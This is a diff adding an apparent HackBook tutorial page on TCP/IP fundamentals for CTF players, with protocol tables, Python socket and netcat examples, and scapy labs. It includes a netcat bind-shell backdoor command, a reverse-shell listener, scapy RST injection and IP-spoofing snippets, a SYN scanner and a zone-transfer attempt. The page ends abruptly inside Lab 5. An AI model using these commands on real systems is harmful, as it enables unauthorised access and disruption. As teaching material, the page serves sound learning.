@@ -1,0 +1,1536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | TCP/IP</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>TCP/IP Fundamentals</h1>
+    <hr>
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-content active" id="notes">
+
+        <!-- OSI vs TCP/IP -->
+        <h2>OSI Model vs TCP/IP Model</h2>
+        <p>The OSI model is a theoretical 7-layer framework. TCP/IP is the practical 4-layer model the internet actually runs on.</p>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr>
+              <th>OSI Layer</th>
+              <th>#</th>
+              <th>TCP/IP Layer</th>
+              <th>Protocols</th>
+              <th>Data Unit</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Application</td><td>7</td>
+              <td rowspan="3">Application</td>
+              <td rowspan="3">HTTP, FTP, SSH, DNS, SMTP, SNMP</td>
+              <td rowspan="3">Data</td>
+            </tr>
+            <tr><td>Presentation</td><td>6</td></tr>
+            <tr><td>Session</td><td>5</td></tr>
+            <tr>
+              <td>Transport</td><td>4</td>
+              <td>Transport</td>
+              <td>TCP, UDP</td>
+              <td>Segment / Datagram</td>
+            </tr>
+            <tr>
+              <td>Network</td><td>3</td>
+              <td>Internet</td>
+              <td>IP, ICMP, ARP</td>
+              <td>Packet</td>
+            </tr>
+            <tr>
+              <td>Data Link</td><td>2</td>
+              <td rowspan="2">Network Access</td>
+              <td rowspan="2">Ethernet, Wi-Fi, PPP</td>
+              <td>Frame</td>
+            </tr>
+            <tr><td>Physical</td><td>1</td><td>Bits</td></tr>
+          </tbody>
+        </table>
+        <p><strong>Key takeaway:</strong> When crafting packets (scapy, raw sockets), you work at layers 3-4. When doing web exploitation, you're at layer 7. Understanding encapsulation (data → segment → packet → frame) is critical for packet analysis.</p>
+
+        <!-- IP Protocol -->
+        <h2>IP Protocol (IPv4)</h2>
+        <h3>IPv4 Header Fields</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Field</th><th>Size</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Version</td><td>4 bits</td><td>Always <code>4</code> for IPv4</td></tr>
+            <tr><td>IHL</td><td>4 bits</td><td>Header length in 32-bit words (min 5 = 20 bytes)</td></tr>
+            <tr><td>DSCP / ECN</td><td>8 bits</td><td>QoS / congestion notification</td></tr>
+            <tr><td>Total Length</td><td>16 bits</td><td>Entire packet size (header + data), max 65535</td></tr>
+            <tr><td>Identification</td><td>16 bits</td><td>Fragment group ID</td></tr>
+            <tr><td>Flags</td><td>3 bits</td><td>DF (Don't Fragment), MF (More Fragments)</td></tr>
+            <tr><td>Fragment Offset</td><td>13 bits</td><td>Position of fragment in original packet</td></tr>
+            <tr><td>TTL</td><td>8 bits</td><td>Hop limit — decremented at each router, packet dropped at 0</td></tr>
+            <tr><td>Protocol</td><td>8 bits</td><td>Upper layer: 1=ICMP, 6=TCP, 17=UDP</td></tr>
+            <tr><td>Header Checksum</td><td>16 bits</td><td>Error checking for header only</td></tr>
+            <tr><td>Source IP</td><td>32 bits</td><td>Sender address (can be spoofed)</td></tr>
+            <tr><td>Destination IP</td><td>32 bits</td><td>Receiver address</td></tr>
+          </tbody>
+        </table>
+
+        <h3>TTL (Time to Live)</h3>
+        <ul>
+          <li>Default TTL by OS: <strong>Linux = 64</strong>, <strong>Windows = 128</strong>, <strong>Cisco = 255</strong></li>
+          <li>Used by <code>traceroute</code> — sends packets with incrementing TTL to map hops</li>
+          <li>TTL in ping replies can fingerprint the target OS</li>
+        </ul>
+
+        <h3>IP Fragmentation</h3>
+        <ul>
+          <li>Packets larger than the MTU (typically 1500 bytes) get fragmented</li>
+          <li>Reassembled at the destination, not at intermediate routers</li>
+          <li><strong>Exploit angle:</strong> Overlapping fragments can bypass firewalls/IDS (Teardrop attack, fragment overlap attacks)</li>
+          <li>DF flag set = router drops packet and sends ICMP "Fragmentation Needed" (used in Path MTU Discovery)</li>
+        </ul>
+
+        <h3>Subnetting & CIDR</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>CIDR</th><th>Subnet Mask</th><th>Hosts</th><th>Notes</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>Single host</td></tr>
+            <tr><td>/31</td><td>255.255.255.254</td><td>2</td><td>Point-to-point link</td></tr>
+            <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Smallest usable subnet</td></tr>
+            <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Class C — most common</td></tr>
+            <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Class B</td></tr>
+            <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>Class A</td></tr>
+          </tbody>
+        </table>
+        <p><strong>Quick math:</strong> Hosts = 2<sup>(32 - prefix)</sup> - 2 (subtract network + broadcast). For /24: 2<sup>8</sup> - 2 = 254 usable hosts.</p>
+        <p><strong>Private ranges:</strong> <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code></p>
+
+        <!-- TCP -->
+        <h2>TCP (Transmission Control Protocol)</h2>
+        <h3>3-Way Handshake</h3>
+<pre><code class="language-bash"># The foundation of every TCP connection
+Client → Server:  SYN         (seq=x)
+Server → Client:  SYN-ACK     (seq=y, ack=x+1)
+Client → Server:  ACK         (seq=x+1, ack=y+1)
+
+# Connection teardown (4-way):
+Client → Server:  FIN
+Server → Client:  ACK
+Server → Client:  FIN
+Client → Server:  ACK</code></pre>
+
+        <h3>TCP Header Fields</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Field</th><th>Size</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Source Port</td><td>16 bits</td><td>Sender port (0-65535)</td></tr>
+            <tr><td>Destination Port</td><td>16 bits</td><td>Receiver port</td></tr>
+            <tr><td>Sequence Number</td><td>32 bits</td><td>Byte position in stream</td></tr>
+            <tr><td>Acknowledgment Number</td><td>32 bits</td><td>Next expected byte from sender</td></tr>
+            <tr><td>Data Offset</td><td>4 bits</td><td>Header length in 32-bit words</td></tr>
+            <tr><td>Flags</td><td>6 bits</td><td>SYN, ACK, FIN, RST, PSH, URG</td></tr>
+            <tr><td>Window Size</td><td>16 bits</td><td>Receive buffer size (flow control)</td></tr>
+            <tr><td>Checksum</td><td>16 bits</td><td>Error detection (header + data + pseudo-header)</td></tr>
+            <tr><td>Urgent Pointer</td><td>16 bits</td><td>Offset for urgent data (if URG flag set)</td></tr>
+          </tbody>
+        </table>
+
+        <h3>TCP Flags</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Flag</th><th>Hex</th><th>Description</th><th>CTF Relevance</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>SYN</strong></td><td>0x02</td><td>Synchronize — initiate connection</td><td>SYN scan (nmap -sS), stealth scanning</td></tr>
+            <tr><td><strong>ACK</strong></td><td>0x10</td><td>Acknowledge — confirms receipt</td><td>ACK scan for firewall mapping</td></tr>
+            <tr><td><strong>FIN</strong></td><td>0x01</td><td>Finish — graceful close</td><td>FIN scan (nmap -sF), evade firewalls</td></tr>
+            <tr><td><strong>RST</strong></td><td>0x04</td><td>Reset — abort connection</td><td>Port closed = RST response</td></tr>
+            <tr><td><strong>PSH</strong></td><td>0x08</td><td>Push — deliver data immediately</td><td>Forces app-layer processing</td></tr>
+            <tr><td><strong>URG</strong></td><td>0x20</td><td>Urgent — out-of-band data</td><td>Rarely used, can confuse IDS</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Sequence Numbers & Window Size</h3>
+        <ul>
+          <li><strong>Sequence number:</strong> Tracks byte position in the stream. ISN (Initial Sequence Number) is randomly chosen during handshake.</li>
+          <li>If ISN is predictable → TCP session hijacking is possible (blind spoofing)</li>
+          <li><strong>Window size:</strong> Advertises how many bytes the receiver can buffer. Window size 0 = "stop sending" (flow control).</li>
+          <li><strong>Window scaling:</strong> TCP option that multiplies window size for high-bandwidth connections</li>
+        </ul>
+
+        <!-- UDP -->
+        <h2>UDP (User Datagram Protocol)</h2>
+        <h3>Characteristics</h3>
+        <ul>
+          <li><strong>Connectionless</strong> — no handshake, no guaranteed delivery, no ordering</li>
+          <li><strong>Fast</strong> — minimal overhead (8-byte header vs TCP's 20+ bytes)</li>
+          <li><strong>No state</strong> — harder to scan (no RST for closed ports, ICMP unreachable instead)</li>
+        </ul>
+
+        <h3>UDP Header (8 bytes)</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Field</th><th>Size</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Source Port</td><td>16 bits</td><td>Sender port</td></tr>
+            <tr><td>Destination Port</td><td>16 bits</td><td>Receiver port</td></tr>
+            <tr><td>Length</td><td>16 bits</td><td>Header + data length</td></tr>
+            <tr><td>Checksum</td><td>16 bits</td><td>Optional in IPv4, mandatory in IPv6</td></tr>
+          </tbody>
+        </table>
+
+        <h3>When UDP is Used</h3>
+        <ul>
+          <li><strong>DNS</strong> (port 53) — quick lookups, falls back to TCP for large responses</li>
+          <li><strong>DHCP</strong> (ports 67/68) — client doesn't have an IP yet, can't do TCP</li>
+          <li><strong>SNMP</strong> (port 161) — network monitoring</li>
+          <li><strong>TFTP</strong> (port 69) — simple file transfer (no auth!)</li>
+          <li><strong>VoIP/RTP</strong>, video streaming, gaming — latency-sensitive</li>
+        </ul>
+
+        <!-- ICMP -->
+        <h2>ICMP (Internet Control Message Protocol)</h2>
+        <p>ICMP rides on top of IP (protocol number 1) but is considered a network-layer protocol. Not used for data transfer — it's for diagnostics and error reporting.</p>
+
+        <h3>Key ICMP Types</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Type</th><th>Code</th><th>Name</th><th>Usage</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>0</td><td>0</td><td>Echo Reply</td><td>Ping response</td></tr>
+            <tr><td>3</td><td>0</td><td>Dest Network Unreachable</td><td>No route to host</td></tr>
+            <tr><td>3</td><td>1</td><td>Dest Host Unreachable</td><td>Host down or filtered</td></tr>
+            <tr><td>3</td><td>3</td><td>Dest Port Unreachable</td><td>UDP port closed</td></tr>
+            <tr><td>3</td><td>13</td><td>Communication Filtered</td><td>Firewall blocking</td></tr>
+            <tr><td>8</td><td>0</td><td>Echo Request</td><td>Ping request</td></tr>
+            <tr><td>11</td><td>0</td><td>Time Exceeded (TTL)</td><td>Used by traceroute</td></tr>
+            <tr><td>5</td><td>—</td><td>Redirect</td><td>ICMP redirect attack vector</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Ping & Traceroute</h3>
+<pre><code class="language-bash"># Basic ping
+ping -c 4 target.com
+
+# Traceroute (Linux uses UDP by default, Windows uses ICMP)
+traceroute target.com          # Linux - UDP
+traceroute -I target.com       # Linux - ICMP
+tracert target.com             # Windows - ICMP
+
+# Traceroute with TCP (bypasses firewalls that block ICMP/UDP)
+tcptraceroute target.com 80</code></pre>
+
+        <!-- Common Ports -->
+        <h2>Common Ports (Top 20 for CTF)</h2>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Port</th><th>Protocol</th><th>Service</th><th>CTF Notes</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>21</td><td>TCP</td><td>FTP</td><td>Anonymous login, clear-text creds</td></tr>
+            <tr><td>22</td><td>TCP</td><td>SSH</td><td>Brute force, key-based auth, tunneling</td></tr>
+            <tr><td>23</td><td>TCP</td><td>Telnet</td><td>Clear-text, sniff credentials</td></tr>
+            <tr><td>25</td><td>TCP</td><td>SMTP</td><td>Email enumeration, open relay</td></tr>
+            <tr><td>53</td><td>TCP/UDP</td><td>DNS</td><td>Zone transfer, DNS tunneling</td></tr>
+            <tr><td>80</td><td>TCP</td><td>HTTP</td><td>Web exploits, directory busting</td></tr>
+            <tr><td>110</td><td>TCP</td><td>POP3</td><td>Clear-text email retrieval</td></tr>
+            <tr><td>111</td><td>TCP</td><td>RPCbind</td><td>Enumerate NFS shares</td></tr>
+            <tr><td>135</td><td>TCP</td><td>MS-RPC</td><td>Windows enumeration</td></tr>
+            <tr><td>139</td><td>TCP</td><td>NetBIOS</td><td>SMB over NetBIOS</td></tr>
+            <tr><td>143</td><td>TCP</td><td>IMAP</td><td>Email access</td></tr>
+            <tr><td>443</td><td>TCP</td><td>HTTPS</td><td>TLS inspection, cert issues</td></tr>
+            <tr><td>445</td><td>TCP</td><td>SMB</td><td>EternalBlue, share enum, PtH</td></tr>
+            <tr><td>993</td><td>TCP</td><td>IMAPS</td><td>Encrypted IMAP</td></tr>
+            <tr><td>1433</td><td>TCP</td><td>MSSQL</td><td>xp_cmdshell, SQLi</td></tr>
+            <tr><td>3306</td><td>TCP</td><td>MySQL</td><td>UDF exploits, SQLi</td></tr>
+            <tr><td>3389</td><td>TCP</td><td>RDP</td><td>BlueKeep, brute force</td></tr>
+            <tr><td>5432</td><td>TCP</td><td>PostgreSQL</td><td>COPY TO for RCE</td></tr>
+            <tr><td>6379</td><td>TCP</td><td>Redis</td><td>Unauthenticated access, RCE</td></tr>
+            <tr><td>8080</td><td>TCP</td><td>HTTP-Alt</td><td>Proxy, alt web server, Tomcat</td></tr>
+          </tbody>
+        </table>
+
+        <!-- Socket Programming -->
+        <h2>Socket Programming (Python for CTF)</h2>
+        <h3>TCP Client</h3>
+<pre><code class="language-python">import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("target.com", 1337))
+
+# Receive banner
+banner = s.recv(4096)
+print(banner.decode())
+
+# Send data
+s.send(b"hello\n")
+response = s.recv(4096)
+print(response.decode())
+
+s.close()</code></pre>
+
+        <h3>TCP Server</h3>
+<pre><code class="language-python">import socket
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind(("0.0.0.0", 9999))
+server.listen(5)
+
+print("[*] Listening on 0.0.0.0:9999")
+while True:
+    client, addr = server.accept()
+    print(f"[+] Connection from {addr}")
+    client.send(b"Connected!\n")
+    data = client.recv(4096)
+    print(f"Received: {data.decode()}")
+    client.close()</code></pre>
+
+        <h3>UDP Client</h3>
+<pre><code class="language-python">import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(b"ping", ("target.com", 9999))
+data, addr = s.recvfrom(4096)
+print(f"Reply from {addr}: {data.decode()}")</code></pre>
+
+        <h3>Using pwntools (preferred for CTF)</h3>
+<pre><code class="language-python">from pwn import *
+
+# TCP connection
+r = remote("target.com", 1337)
+r.recvline()              # read one line
+r.sendline(b"answer")     # send with newline
+r.interactive()           # drop to interactive shell
+
+# Listen for reverse shell
+l = listen(4444)
+l.wait_for_connection()
+l.interactive()</code></pre>
+
+        <!-- Netcat -->
+        <h2>Netcat (nc / ncat)</h2>
+<pre><code class="language-bash"># Connect to a service
+nc target.com 80
+
+# Listener (reverse shell catcher)
+nc -lvnp 4444
+
+# File transfer
+# Receiver:
+nc -lvnp 9999 > received_file
+# Sender:
+nc target.com 9999 < file_to_send
+
+# Simple chat
+# Server: nc -lvnp 4444
+# Client: nc target.com 4444
+
+# Port scanning (basic)
+nc -zv target.com 1-1000
+
+# Banner grabbing
+echo "" | nc -v target.com 22
+
+# Execute shell on connection (backdoor - use ncat for -e)
+ncat -lvnp 4444 -e /bin/bash
+
+# Proxy / port forwarding
+ncat -lvnp 8080 --sh-exec "ncat target.com 80"</code></pre>
+
+        <!-- TCP Session Hijacking -->
+        <h2>TCP Session Hijacking</h2>
+        <ul>
+          <li><strong>Concept:</strong> Attacker injects packets into an active TCP session by predicting/sniffing sequence numbers</li>
+          <li><strong>Requirements:</strong> Must know src/dst IP, src/dst port, and current sequence numbers</li>
+          <li><strong>Blind hijacking:</strong> Attacker can't see traffic — must predict ISN (hard with modern randomized ISNs)</li>
+          <li><strong>On-path hijacking:</strong> Attacker can sniff traffic (ARP spoofing, MITM) — trivial to get seq numbers</li>
+          <li><strong>Tools:</strong> <code>ettercap</code>, <code>bettercap</code>, <code>scapy</code></li>
+        </ul>
+<pre><code class="language-python"># Scapy: Inject a RST to kill a connection (requires sniffed seq/ack)
+from scapy.all import *
+
+ip = IP(src="victim_ip", dst="server_ip")
+tcp = TCP(sport=victim_port, dport=80, flags="R", seq=sniffed_seq)
+send(ip/tcp)</code></pre>
+
+        <!-- IP Spoofing -->
+        <h2>IP Spoofing</h2>
+        <ul>
+          <li><strong>Concept:</strong> Forging the source IP in packet headers</li>
+          <li>Easy with UDP/ICMP (connectionless — no handshake to complete)</li>
+          <li>Hard with TCP — you need to complete the 3-way handshake, which requires seeing the SYN-ACK (sent to the spoofed IP)</li>
+          <li><strong>Use cases:</strong> DDoS amplification, bypassing IP-based ACLs, DNS spoofing</li>
+          <li><strong>Defense:</strong> Ingress/egress filtering (BCP38), SYN cookies, randomized ISNs</li>
+        </ul>
+<pre><code class="language-python"># Scapy: Send a spoofed ping
+from scapy.all import *
+
+pkt = IP(src="1.2.3.4", dst="target.com") / ICMP()
+send(pkt)</code></pre>
+
+        <!-- Useful Commands -->
+        <h2>Useful Commands</h2>
+<pre><code class="language-bash"># ss - modern replacement for netstat
+ss -tlnp                    # TCP listening ports with process info
+ss -ulnp                    # UDP listening ports
+ss -s                       # Socket statistics summary
+ss -tn state established    # Active connections
+
+# netstat (legacy but common on older systems)
+netstat -tlnp               # TCP listening
+netstat -an                 # All connections, numeric
+netstat -rn                 # Routing table
+
+# ip (modern replacement for ifconfig/route)
+ip addr show                # Show interfaces and IPs
+ip route show               # Show routing table
+ip neigh show               # ARP table (ip neighbor)
+ip link set eth0 up/down    # Enable/disable interface
+
+# ifconfig (legacy)
+ifconfig                    # Show interfaces
+ifconfig eth0 192.168.1.100 netmask 255.255.255.0  # Set IP
+
+# ARP
+arp -a                      # Show ARP cache
+arping 192.168.1.1          # ARP-level ping
+
+# DNS
+dig target.com              # DNS lookup
+dig axfr @ns.target.com target.com  # Zone transfer attempt
+nslookup target.com
+host target.com
+
+# Packet capture
+tcpdump -i eth0 -nn         # Capture all traffic
+tcpdump -i eth0 port 80     # Filter by port
+tcpdump -i eth0 -w cap.pcap # Write to file
+tcpdump -r cap.pcap         # Read pcap</code></pre>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-content" id="lab">
+
+        <!-- Lab 1 -->
+        <div class="lab-card">
+          <h4>Lab 1: Python TCP Client/Server</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Build a TCP client and server in Python. The server sends a welcome message, the client responds, and the server echoes it back.</p>
+
+          <h5>Server (server.py)</h5>
+<pre><code class="language-python">import socket
+import threading
+
+def handle_client(conn, addr):
+    print(f"[+] Connection from {addr}")
+    conn.send(b"Welcome to the TCP Lab! Send me a message:\n")
+    data = conn.recv(1024)
+    if data:
+        response = f"Echo: {data.decode().strip()}\n"
+        conn.send(response.encode())
+    conn.close()
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+server.bind(("0.0.0.0", 9999))
+server.listen(5)
+print("[*] Listening on 0.0.0.0:9999")
+
+while True:
+    conn, addr = server.accept()
+    t = threading.Thread(target=handle_client, args=(conn, addr))
+    t.start()</code></pre>
+
+          <h5>Client (client.py)</h5>
+<pre><code class="language-python">import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1", 9999))
+
+# Receive welcome
+banner = s.recv(1024)
+print(banner.decode(), end="")
+
+# Send message
+msg = input("Your message: ")
+s.send(msg.encode() + b"\n")
+
+# Receive echo
+response = s.recv(1024)
+print(response.decode(), end="")
+s.close()</code></pre>
+
+          <h5>Test it</h5>
+<pre><code class="language-bash"># Terminal 1
+python3 server.py
+
+# Terminal 2
+python3 client.py
+
+# Or use netcat as the client
+nc 127.0.0.1 9999</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Modify the server to handle multiple messages per connection (loop until client sends "quit")</li>
+            <li>Add a timestamp to each echoed message</li>
+            <li>Capture the traffic with <code>tcpdump -i lo port 9999</code> and verify the 3-way handshake in Wireshark</li>
+          </ul>
+        </div>
+
+        <!-- Lab 2 -->
+        <div class="lab-card">
+          <h4>Lab 2: Netcat for Everything</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use netcat for file transfer, chat, banner grabbing, and basic port scanning.</p>
+
+          <h5>File Transfer</h5>
+<pre><code class="language-bash"># Create a test file
+echo "flag{netcat_file_transfer}" > secret.txt
+
+# Receiver (start first)
+nc -lvnp 9999 > received.txt
+
+# Sender (in another terminal)
+nc 127.0.0.1 9999 < secret.txt
+
+# Verify
+cat received.txt</code></pre>
+
+          <h5>Chat Server</h5>
+<pre><code class="language-bash"># Person A
+nc -lvnp 4444
+
+# Person B
+nc 127.0.0.1 4444
+
+# Now type messages back and forth</code></pre>
+
+          <h5>Banner Grabbing</h5>
+<pre><code class="language-bash"># SSH banner
+echo "" | nc -v -w3 target.com 22
+
+# HTTP banner
+echo -e "HEAD / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
+
+# SMTP banner
+nc -v target.com 25</code></pre>
+
+          <h5>Port Scanning</h5>
+<pre><code class="language-bash"># Scan ports 1-100 on target
+nc -zv 127.0.0.1 1-100 2>&1 | grep -i "open\|succeeded"
+
+# Scan specific ports
+for port in 21 22 80 443 8080; do
+    nc -zv -w1 target.com $port 2>&1 | grep -i "open\|succeeded"
+done</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Transfer a binary file (e.g., <code>/bin/ls</code>) and verify with <code>md5sum</code></li>
+            <li>Set up a netcat relay: nc listener → forwards to another nc listener</li>
+            <li>Grab banners from 5 different services on a target box</li>
+          </ul>
+        </div>
+
+        <!-- Lab 3 -->
+        <div class="lab-card">
+          <h4>Lab 3: Raw Socket Packet Crafting with Scapy</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use scapy to craft and send custom packets. Explore IP, TCP, UDP, and ICMP layers hands-on.</p>
+
+          <h5>Setup</h5>
+<pre><code class="language-bash">pip install scapy
+# Run as root for raw socket access
+sudo python3</code></pre>
+
+          <h5>Craft and Send Packets</h5>
+<pre><code class="language-python">from scapy.all import *
+
+# 1. ICMP Ping
+pkt = IP(dst="8.8.8.8") / ICMP()
+resp = sr1(pkt, timeout=2)
+resp.show()
+
+# 2. Custom TCP SYN packet
+syn = IP(dst="target.com") / TCP(dport=80, flags="S", seq=1000)
+resp = sr1(syn, timeout=2)
+print(f"Flags: {resp[TCP].flags}")   # Should be SA (SYN-ACK)
+print(f"Seq: {resp[TCP].seq}")
+print(f"Ack: {resp[TCP].ack}")
+
+# 3. UDP packet
+udp_pkt = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
+resp = sr1(udp_pkt, timeout=2)
+resp[DNS].show()
+
+# 4. Inspect packet layers
+pkt = IP(dst="target.com") / TCP(dport=80, flags="S")
+pkt.show()           # Show all fields
+hexdump(pkt)         # Raw hex
+ls(TCP)              # List all TCP fields
+
+# 5. Traceroute with scapy
+ans, unans = traceroute(["google.com"], maxttl=15)
+ans.summary()</code></pre>
+
+          <h5>Sniffing</h5>
+<pre><code class="language-python"># Sniff 10 packets on the wire
+pkts = sniff(count=10, filter="tcp")
+pkts.summary()
+
+# Sniff with a callback
+def pkt_callback(pkt):
+    if pkt.haslayer(TCP):
+        print(f"{pkt[IP].src}:{pkt[TCP].sport} → {pkt[IP].dst}:{pkt[TCP].dport} [{pkt[TCP].flags}]")
+
+sniff(filter="tcp", prn=pkt_callback, count=20)</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Craft a DNS query and decode the response</li>
+            <li>Send an ICMP packet with custom data in the payload</li>
+            <li>Sniff HTTP traffic and extract Host headers</li>
+            <li>Build a packet with IP options set</li>
+          </ul>
+        </div>
+
+        <!-- Lab 4 -->
+        <div class="lab-card">
+          <h4>Lab 4: TCP 3-Way Handshake & SYN Scan with Scapy</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Manually perform a TCP 3-way handshake using scapy, then implement a SYN scan (half-open scan) like nmap -sS.</p>
+
+          <h5>Manual 3-Way Handshake</h5>
+<pre><code class="language-python">from scapy.all import *
+
+target = "target.com"
+dport = 80
+
+# Step 1: SYN
+ip = IP(dst=target)
+syn = TCP(sport=RandShort(), dport=dport, flags="S", seq=100)
+syn_ack = sr1(ip/syn, timeout=3)
+
+if syn_ack and syn_ack[TCP].flags == "SA":
+    print(f"[+] SYN-ACK received! Server seq={syn_ack[TCP].seq}")
+
+    # Step 2: ACK (complete the handshake)
+    ack = TCP(
+        sport=syn.sport,
+        dport=dport,
+        flags="A",
+        seq=syn_ack[TCP].ack,
+        ack=syn_ack[TCP].seq + 1
+    )
+    send(ip/ack)
+    print("[+] Handshake complete!")
+
+    # Step 3: Send HTTP request over the connection
+    payload = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target)
+    psh = TCP(
+        sport=syn.sport,
+        dport=dport,
+        flags="PA",
+        seq=syn_ack[TCP].ack,
+        ack=syn_ack[TCP].seq + 1
+    )
+    resp = sr1(ip/psh/payload, timeout=3)
+    if resp and resp.haslayer(Raw):
+        print(resp[Raw].load.decode(errors="ignore")[:500])
+
+    # Clean up: send RST
+    rst = TCP(sport=syn.sport, dport=dport, flags="R", seq=syn_ack[TCP].ack + len(payload))
+    send(ip/rst)
+else:
+    print("[-] No SYN-ACK received")</code></pre>
+
+          <h5>SYN Scanner</h5>
+<pre><code class="language-python">from scapy.all import *
+import sys
+
+def syn_scan(target, ports):
+    """
+    SYN scan (half-open): Send SYN, check for SYN-ACK.
+    Never completes the handshake — sends RST instead.
+    This is what nmap -sS does.
+    """
+    print(f"[*] SYN scanning {target}")
+    open_ports = []
+
+    for port in ports:
+        syn = IP(dst=target) / TCP(sport=RandShort(), dport=port, flags="S")
+        resp = sr1(syn, timeout=1, verbose=0)
+
+        if resp is None:
+            status = "Filtered"
+        elif resp.haslayer(TCP):
+            if resp[TCP].flags == 0x12:  # SYN-ACK
+                open_ports.append(port)
+                status = "Open"
+                # Send RST to close (don't complete handshake)
+                rst = IP(dst=target) / TCP(sport=syn[TCP].sport, dport=port, flags="R")
+                send(rst, verbose=0)
+            elif resp[TCP].flags == 0x14:  # RST-ACK
+                status = "Closed"
+            else:
+                status = f"Unknown flags: {resp[TCP].flags}"
+        else:
+            status = "Filtered"
+
+        if status != "Closed":
+            print(f"  Port {port}: {status}")
+
+    print(f"\n[+] Open ports: {open_ports}")
+    return open_ports
+
+# Scan common ports
+ports = [21, 22, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 8080]
+syn_scan("target.com", ports)</code></pre>
+
+          <h5>Exercises</h5>
+          <ul>
+            <li>Compare your SYN scan results with <code>nmap -sS target</code></li>
+            <li>Add service detection by grabbing banners from open ports</li>
+            <li>Implement a FIN scan — open ports won't respond, closed ports send RST</li>
+            <li>Add threading to scan faster (be careful with scapy + threads)</li>
+          </ul>
+        </div>
+
+        <!-- Lab 5 -->
+        <div class="lab-card">
+          <h4>Lab 5: UDP Client/Server</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Build a UDP echo server and client. Observe the connectionless nature of UDP — no handshake, no guaranteed delivery.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># udp_server.py
+import socket
+
+server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+server.bind(("0.0.0.0", 9999))
+print("[*] UDP server listening on 0.0.0.0:9999")
+
+while True:
+    data, addr = server.recvfrom(1024)
+    print(f"[+] {addr}: {data.decode()}")
+    server.sendto(f"Echo: {data.decode()}".encode(), addr)</code></pre>
+<pre><code class="language-python"># udp_client.py
+import socket
+
